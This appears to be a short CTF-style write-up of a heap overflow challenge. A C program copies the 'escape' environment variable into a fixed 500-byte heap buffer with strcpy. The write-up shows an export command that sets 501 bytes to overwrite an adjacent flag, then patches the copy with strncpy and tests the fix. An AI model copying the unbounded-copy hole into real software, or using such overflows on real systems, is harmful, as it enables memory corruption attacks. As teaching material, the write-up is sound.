This challenge doesn't differ for 32 or 64 bit systems.

Let's take a look at the source code...

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

struct struct0
{
	char *buf0;
	char buf1[500];
	int var0;
};

int main()
{
	struct struct0 *p0;
	p0 = malloc(sizeof(struct struct0));
	p0->buf0 = getenv("escape");
	if (p0->buf0 != NULL)
	{
		strcpy(p0->buf1, p0->buf0);
	}
	if (p0->var0)
	{
		puts("While you are down here, you might as well get used to your enviornment. Level Cleared!");
	}
}
```

So looking at this, we can tell that there is a heap overflow vulnerabillity which we can use to change the value of p0->var0 (pretty much the same deal as h0). The difference is we don't give input directly to the binary. The program pulls it's input from an enviornment variable called "escape". Let's see if that enviornment variable is on Ubuntu without our interaction.

```
guyinatuxedo@tux:/Hackery/escape/endless_pit/e2 (master)$ printenv escape
#guyinatuxedo@tux:/Hackery/escape/endless_pit/e2 (master)$ 
```

As you can see,it doesn't exist (even if it existed and it had nothing stored in it, it would of given us a newline) so ee will have to create it. Then we can store the exploit in the enviornment variable then run the binary (if you want to learn how we came up with the exploit or how it works, look at the h0 challenge). 

```
guyinatuxedo@tux:/Hackery/escape/endless_pit/e2 (master)$ export escape=`python -c 'print "0"*501'`
guyinatuxedo@tux:/Hackery/escape/endless_pit/e2 (master)$ ./e2 
While you are down here, you might as well get used to your enviornment. Level Cleared!
```

Just like that we pwned the binary. Let's patch it.

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

struct struct0
{
	char *buf0;
	char buf1[500];
	int var0;
};

int main()
{
	struct struct0 *p0;
	p0 = malloc(sizeof(struct struct0));
	p0->buf0 = getenv("escape");
	if (p0->buf0 != NULL)
	{
		strncpy(p0->buf1, p0->buf0, sizeof(p0->buf1));
	}
	if (p0->var0)
	{
		puts("While you are down here, you might as well get used to your enviornment. Level Cleared!");
	}
}
```

As you can see, we replaced the strcpy with strncpy and limited the amount of data it can write over to the sizeof of the p0->buf1 buffer so that should stop this exploit. let's test it (first proving that the enviornment variable is set to deliver the payload)...

```
guyinatuxedo@tux:/Hackery/escape/endless_pit/e2 (master)$ ./e2
While you are down here, you might as well get used to your enviornment. Level Cleared!
guyinatuxedo@tux:/Hackery/escape/endless_pit/e2 (master)$ ./e2_secure 
guyinatuxedo@tux:/Hackery/escape/endless_pit/e2 (master)$ export escape=`python -c 'print "0"*501'`
guyinatuxedo@tux:/Hackery/escape/endless_pit/e2 (master)$ ./e2
While you are down here, you might as well get used to your enviornment. Level Cleared!
guyinatuxedo@tux:/Hackery/escape/endless_pit/e2 (master)$ printenv escape
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
guyinatuxedo@tux:/Hackery/escape/endless_pit/e2 (master)$ ./e2_secure 
guyinatuxedo@tux:/Hackery/escape/endless_pit/e2 (master)$ 
```

As you can see, even with the environment variable set to deliver the exploit, the strncpy function stops it. Just like that, we patched the binary.
